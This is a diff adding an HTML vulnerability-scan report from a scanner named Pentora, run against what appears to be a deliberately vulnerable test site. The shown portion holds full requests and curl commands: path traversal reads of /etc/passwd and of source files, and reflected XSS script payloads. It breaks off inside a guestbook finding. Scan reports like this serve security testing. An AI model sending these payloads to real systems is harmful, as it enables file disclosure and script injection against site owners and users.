@@ -1,0 +1,1978 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Pentora scan report</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="css/kube.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/master.css" />
+</head>
+<body>
+    <div id="page">
+        <header style="text-align: center">
+        <h2 class="title" style="text-align: center">Pentora vulnerability report</h2>
+        <h3>Target: http://testphp.vulnweb.com/</h3>
+        <p>Date of the scan: Fri, 14 Mar 2025 18:53:09 +0000. Scope of the scan: folder. Crawled pages: 76</p>
+        </header>
+        <hr />
+
+        <h4>Summary</h4>
+        <table class="width-100 hovered" style="background: url('Pentora_logo.png') no-repeat center;">
+            <thead>
+                <tr>
+                    <th>Category</th>
+                    <th>Number of vulnerabilities found</th>
+                </tr>
+            </thead>
+            <tbody id="summary">
+                    <tr>
+                        <td class="small">
+                            Backup file
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Weak credentials
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            CRLF Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Content Security Policy Configuration
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Cross Site Request Forgery
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Potentially dangerous file
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Command execution
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_7">Path Traversal</a>
+                        </td>
+                        <td class="small .text-centered">4</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web application framework
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web server
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HTML Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Clickjacking Protection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HTTP Strict Transport Security (HSTS)
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            MIME Type Confusion
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HttpOnly Flag cookie
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            LDAP Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Log4Shell
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Open Redirect
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_18">Reflected Cross Site Scripting</a>
+                        </td>
+                        <td class="small .text-centered">16</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Secure Flag cookie
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Spring4Shell
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_21">SQL Injection</a>
+                        </td>
+                        <td class="small .text-centered">22</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Stored HTML Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Stored Cross Site Scripting
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Blind SQL Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Unrestricted File Upload
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Vulnerable software
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Internal Server Error
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Resource consumption
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Review Webserver Metafiles for Information Leakage
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web technology
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HTTP Methods
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+            </tbody>
+        </table>
+        <hr />
+        <div id="details">
+                <h3 id="vuln_type_7">Path Traversal</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>This attack is known as Path or Directory Traversal. Its aim is the access to files and directories that are stored outside the web root folder. The attacker tries to explore the directories stored in the web server. The attacker uses some techniques, for instance, the manipulation of variables that reference files with &#39;dot-dot-slash (../)&#39; sequences and its variations to move up to root directory to navigate through the file system.</dd>
+                    <dt>CVSS Score</dt>
+                    <dd>
+                        <span class="cvss-score high">7.5</span>
+                        <span class="cvss-severity">High</span>
+                        <span class="cvss-vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</span>
+                    </dd>
+                </dl>
+
+                        <h4>🔥 Vulnerability found in /showimage.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">7.5</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-7-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-7-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-7-0-4">cURL command line</a>
+                            <a href="#tab-vuln-7-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-7-0-1" style="min-height: 124px;">
+                            <pre>Possible fopen() vulnerability via injection in the parameter file</pre>
+                        </section>
+                        <section id="tab-vuln-7-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /showimage.php?file=%2Fetc%2Fpasswd&amp;size=160 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-7-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/showimage.php?file=%2Fetc%2Fpasswd&amp;size=160&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-7-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-ATHZ-01&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /showimage.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">7.5</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-7-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-7-1-2">HTTP Request</a>
+                            <a href="#tab-vuln-7-1-4">cURL command line</a>
+                            <a href="#tab-vuln-7-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-7-1-1" style="min-height: 124px;">
+                            <pre>Possible source code disclosure via injection in the parameter file</pre>
+                        </section>
+                        <section id="tab-vuln-7-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /showimage.php?file=showimage.php&amp;size=160 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-7-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/showimage.php?file=showimage.php&amp;size=160&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-7-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-ATHZ-01&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /showimage.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">7.5</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-7-2-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-7-2-2">HTTP Request</a>
+                            <a href="#tab-vuln-7-2-4">cURL command line</a>
+                            <a href="#tab-vuln-7-2-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-7-2-1" style="min-height: 124px;">
+                            <pre>Possible fopen() vulnerability via injection in the parameter file</pre>
+                        </section>
+                        <section id="tab-vuln-7-2-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /showimage.php?file=%2Fetc%2Fpasswd HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-7-2-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/showimage.php?file=%2Fetc%2Fpasswd&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-7-2-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-ATHZ-01&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /showimage.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">7.5</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-7-3-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-7-3-2">HTTP Request</a>
+                            <a href="#tab-vuln-7-3-4">cURL command line</a>
+                            <a href="#tab-vuln-7-3-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-7-3-1" style="min-height: 124px;">
+                            <pre>Possible source code disclosure via injection in the parameter file</pre>
+                        </section>
+                        <section id="tab-vuln-7-3-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /showimage.php?file=showimage.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-7-3-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/showimage.php?file=showimage.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-7-3-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-ATHZ-01&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return 'Czechoslovakian'). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user's input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include">OWASP: Path Traversal</a></li>
+                    <li><a href="https://www.acunetix.com/websitesecurity/directory-traversal/">Acunetix: What is a Directory Traversal attack?</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (&#39;Path Traversal&#39;)</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_18">Reflected Cross Site Scripting</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts.</dd>
+                    <dt>CVSS Score</dt>
+                    <dd>
+                        <span class="cvss-score medium">6.1</span>
+                        <span class="cvss-severity">Medium</span>
+                        <span class="cvss-vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span>
+                    </dd>
+                </dl>
+
+                        <h4>🟠 Vulnerability found in /artists.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-0-4">cURL command line</a>
+                            <a href="#tab-vuln-18-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-0-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-18-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /artists.php?artist=%3CScRiPt%3Ealert%28%27whyx363nfx%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/artists.php?artist=%3CScRiPt%3Ealert%28%27whyx363nfx%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /hpp/ 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-1-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-1-4">cURL command line</a>
+                            <a href="#tab-vuln-18-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-1-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter pp</pre>
+                        </section>
+                        <section id="tab-vuln-18-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wga31hjv9t%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wga31hjv9t%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /hpp/params.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-2-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-2-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-2-4">cURL command line</a>
+                            <a href="#tab-vuln-18-2-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-2-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter p</pre>
+                        </section>
+                        <section id="tab-vuln-18-2-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /hpp/params.php?p=%3CScRiPt%3Ealert%28%27w9g2vn7qoo%27%29%3C%2FsCrIpT%3E&amp;pp=12 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-2-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/hpp/params.php?p=%3CScRiPt%3Ealert%28%27w9g2vn7qoo%27%29%3C%2FsCrIpT%3E&amp;pp=12&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-2-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /hpp/params.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-3-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-3-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-3-4">cURL command line</a>
+                            <a href="#tab-vuln-18-3-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-3-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter pp</pre>
+                        </section>
+                        <section id="tab-vuln-18-3-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /hpp/params.php?p=valid&amp;pp=%3CScRiPt%3Ealert%28%27wnlivlj86f%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-3-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=%3CScRiPt%3Ealert%28%27wnlivlj86f%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-3-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-4-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-4-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-4-4">cURL command line</a>
+                            <a href="#tab-vuln-18-4-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-4-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter cat</pre>
+                        </section>
+                        <section id="tab-vuln-18-4-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?cat=%3CScRiPt%3Ealert%28%27w6f64e5ku0%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-4-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?cat=%3CScRiPt%3Ealert%28%27w6f64e5ku0%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-4-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-5-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-5-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-5-4">cURL command line</a>
+                            <a href="#tab-vuln-18-5-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-5-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-18-5-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?artist=%3CScRiPt%3Ealert%28%27wyzkutj55u%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-5-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?artist=%3CScRiPt%3Ealert%28%27wyzkutj55u%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-5-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /product.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-6-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-6-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-6-4">cURL command line</a>
+                            <a href="#tab-vuln-18-6-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-6-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter pic</pre>
+                        </section>
+                        <section id="tab-vuln-18-6-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /product.php?pic=%3CScRiPt%3Ealert%28%27w4m65pt07y%27%29%3C%2FsCrIpT%3E HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-6-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/product.php?pic=%3CScRiPt%3Ealert%28%27w4m65pt07y%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-6-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /guestbook.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-7-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-7-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-7-4">cURL command line</a>
+                            <a href="#tab-vuln-18-7-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-7-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter name</pre>
+                        </section>
+                        <section id="tab-vuln-18-7-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/guestbook.php
+                                    <br>
+                                    content-length: 95
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=%3CScRiPt%3Ealert%28%27w9d475bdkb%27%29%3C%2FsCrIpT%3E&amp;submit=add%20message&amp;text=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-7-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/guestbook.php&#34; -e &#34;http://testphp.vulnweb.com/guestbook.php&#34; -d &#34;name=%3CScRiPt%3Ealert%28%27w9d475bdkb%27%29%3C%2FsCrIpT%3E&amp;submit=add%20message&amp;text=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-7-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /guestbook.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-8-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-8-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-8-4">cURL command line</a>
+                            <a href="#tab-vuln-18-8-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-8-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter text</pre>
+                        </section>
+                        <section id="tab-vuln-18-8-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
